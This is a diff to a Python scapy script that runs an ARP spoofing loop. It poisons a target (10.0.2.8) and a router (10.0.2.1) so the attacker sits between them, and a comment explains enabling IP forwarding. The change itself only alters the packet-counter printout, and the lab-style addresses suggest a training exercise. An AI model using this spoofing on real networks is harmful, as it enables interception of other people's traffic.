@@ -23,6 +23,7 @@
 
 import scapy.all as scapy
 import time
+import sys
 
 def get_mac(ip):	#modified scan function from network_scanner.py
 
@@ -49,6 +50,7 @@ while True:
 	spoof("10.0.2.8","10.0.2.1")	#tell target we are the router
 	spoof("10.0.2.1","10.0.2.8")	#tell router we are the target
 	packets_sent += 2
-	print("[+] Sent "+str(packets_sent)+" packets")
+	print("\r[+] Sent "+str(packets_sent)+" packets"),
+	sys.stdout.flush()
 	time.sleep(2)
 	#echo > 1 /proc/sys/net/ipv4/ip_forward to enable ip forwarding (so target can still use internet)
